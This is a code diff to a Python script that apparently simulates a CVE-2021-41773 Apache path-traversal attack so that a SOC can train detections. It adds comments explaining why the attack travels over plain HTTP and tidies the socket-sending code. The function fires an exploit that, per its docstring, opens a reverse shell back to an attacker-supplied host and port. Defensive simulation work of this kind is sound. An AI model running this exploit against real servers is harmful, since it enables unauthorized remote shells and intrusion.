@@ -6,6 +6,16 @@ from urllib.parse import urlparse
 from chainlog import log
 
 
+# Transport: the attacker fires plain HTTP (port 80) even though apache also
+# serves HTTPS on :443. Realistic detection signal: in a TLS-everywhere
+# production environment (apache redirects normal browser traffic 80 → 443),
+# the only plain-HTTP requests apache receives are bots, scanners, and the
+# attacker's CGI probe — a high-signal indicator a SOC can train on. The
+# CVE-2021-41773 path-traversal works identically over either transport;
+# choosing HTTP keeps the attacker visibly distinct from the noise/activity
+# baselines which all run over TLS.
+
+
 def _build_request(method, host, path, body=""):
     """Assemble a raw HTTP/1.1 request string."""
     return (
@@ -20,26 +30,26 @@ def _build_request(method, host, path, body=""):
 
 
 def _send_request(host, port, request):
-    """Send one raw request over a fresh TCP socket and discard the response.
+    """Send one raw request over a fresh plain-TCP socket.
 
-    A short timeout is enough: the working exploit hijacks the connection with
-    the reverse shell, and the decoy attempts only need to reach the server so
-    they land in the Apache access log.
+    A short timeout is enough: the working exploit hijacks the connection
+    with the reverse shell, and the decoy attempts only need to reach the
+    server so they land in the Apache access log.
     """
-    s = None
+    sock = None
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(3)
-        s.connect((host, port))
-        s.sendall(request.encode())
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(3)
+        sock.connect((host, port))
+        sock.sendall(request.encode())
     except (socket.timeout, ConnectionResetError):
         pass  # expected once the reverse shell takes over the connection
     except Exception as e:
         log(f"[-] Error sending request: {e}")
     finally:
-        if s is not None:
+        if sock is not None:
             try:
-                s.close()
+                sock.close()
             except Exception:
                 pass
 
@@ -70,6 +80,10 @@ def fire_exploit(target_url, lhost, lport, attempt_delay=0):
 
     parsed = urlparse(target_url)
     host = parsed.hostname
+    # Default to :80 — apache's :80 vhost keeps /cgi-bin/ reachable on plain
+    # HTTP (the rewrite rule redirects everything except /cgi-bin/ to HTTPS).
+    # Plain-HTTP traffic is therefore the attacker's visible signature in a
+    # TLS-everywhere baseline.
     port = parsed.port or 80
 
     payload = (
